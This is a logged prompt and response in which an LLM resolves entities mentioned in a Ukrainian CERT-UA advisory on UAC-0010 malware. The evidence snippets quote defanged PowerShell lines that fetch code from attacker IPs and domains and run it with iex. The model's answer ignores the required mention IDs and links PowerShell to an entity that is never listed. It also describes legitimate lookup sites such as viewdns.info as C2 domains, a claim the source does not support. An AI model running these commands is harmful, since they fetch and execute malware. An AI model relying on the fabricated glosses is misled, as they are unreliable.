=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. stage1.ps1
M1. "GammaSteel.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "GammaSteel.NET" (Software) — options: E11, E12, E1, E13 — ctx: S1
M3. "HarvesterX" (Software) — options: E14, E17, E18, E13 — ctx: S1
M4. "PowerShell (powershell.exe)" (Software) — options: E3, E24, E25, E26 — ctx: S2
M5. "lover.printing82.detroito.ru" (Domain) — options: E37, E38, E39, E40
M6. "atlantar.ru" (Domain) — options: E38, E42, E40, E47
M7. "motoristo.ru" (Domain) — options: E52, E43, E53, E38 — ctx: S8
M8. "moolin.ru" (Domain) — options: E50, E38, E55, E41
M9. "bubenci.ru" (Domain) — options: E55, E38, E46, E41
M10. "callsol.ru" (Domain) — options: E60, E45, E47, E38
M11. "clipperso.ru" (Domain) — options: E37, E38, E63, E48
M12. "cooperi.ru" (Domain) — options: E37, E38, E65, E66
M13. "detroito.ru" (Domain) — options: E37, E46, E39, E38
M14. "farafauler.ru" (Domain) — options: E40, E38, E69, E42
M15. "flayga.ru" (Domain) — options: E55, E38, E39, E48 — ctx: S4
M16. "ganara.ru" (Domain) — options: E38, E75, E39, E46 — ctx: S3
M17. "hawksi.ru" (Domain) — options: E46, E38, E37, E50
M18. "hofsteder.ru" (Domain) — options: E37, E38, E79, E40
M19. "kilitro.ru" (Domain) — options: E55, E39, E38, E37
M20. "kurapat.ru" (Domain) — options: E37, E68, E45, E38
M21. "lnasfe.ru" (Domain) — options: E46, E85, E86, E38 — ctx: S6
M22. "lopasts.ru" (Domain) — options: E37, E87, E38, E55
M23. "mafirti.ru" (Domain) — options: E55, E50, E38, E37
M24. "metanat.ru" (Domain) — options: E55, E68, E56, E38
M25. "mitlubald.ru" (Domain) — options: E55, E81, E38, E50
M26. "paparat.ru" (Domain) — options: E37, E68, E74, E38 — ctx: S5
M27. "pasamart.ru" (Domain) — options: E48, E38, E87, E37
M28. "qkcew.ru" (Domain) — options: E46, E38, E60, E37
M29. "rncsq.ru" (Domain) — options: E37, E38, E95, E55
M30. "tarlit.ru" (Domain) — options: E55, E68, E38, E42
M31. "tbwelo.ru" (Domain) — options: E46, E38, E43, E37
M32. "wicksl.ru" (Domain) — options: E46, E38, E76, E37
M33. "xcqef.ru" (Domain) — options: E60, E38, E82, E37
M34. "nxkad.ru" (Domain) — options: E60, E94, E81, E38 — ctx: S7
M35. "dnslookup.seowebchecker.com" (Domain) — options: E100, E101, E102, E103
M36. "tools.nexcess.net" (Domain) — options: E109, E110, E111, E112
M37. "viewdns.info" (Domain) — options: E100, E104, E111, E118
M38. "www.portcheckers.com" (Domain) — options: E123, E124, E53, E125 — ctx: S7

=== RESPONSE (29.8s, in 4330 / out 5552 tok, stop) ===
{"m":"GammaSteel.PS1","id":"NEW","g":"PowerShell implementation of GammaSteel"}
{"m":"GammaSteel.NET","id":"NEW","g":".NET implementation of GammaSteel"}
{"m":"HarvesterX","id":"NEW","g":"a previously used tool"}
{"m":"PowerShell (powershell.exe)","id":"E24","g":null}
{"m":"lover.printing82.detroito.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"atlantar.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"motoristo.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"moolin.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"bubenci.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"callsol.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"clipperso.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"cooperi.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"detroito.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"farafauler.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"flayga.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"ganara.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"hawksi.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"hofsteder.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"kilitro.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"kurapat.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"lnasfe.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"lopasts.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"mafirti.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"metanat.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"mitlubald.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"paparat.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"pasamart.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"qkcew.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"rncsq.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"tarlit.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"tbwelo.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"wicksl.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"xcqef.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"nxkad.ru","id":"NEW","g":"a domain used for C2 communication"}
{"m":"dnslookup.seowebchecker.com","id":"NEW","g":"a domain used for C2 communication"}
{"m":"tools.nexcess.net","id":"NEW","g":"a domain used for C2 communication"}
{"m":"viewdns.info","id":"NEW","g":"a domain used for C2 communication"}
{"m":"www.portcheckers.com","id":"NEW","g":"a domain used for C2 communication"}
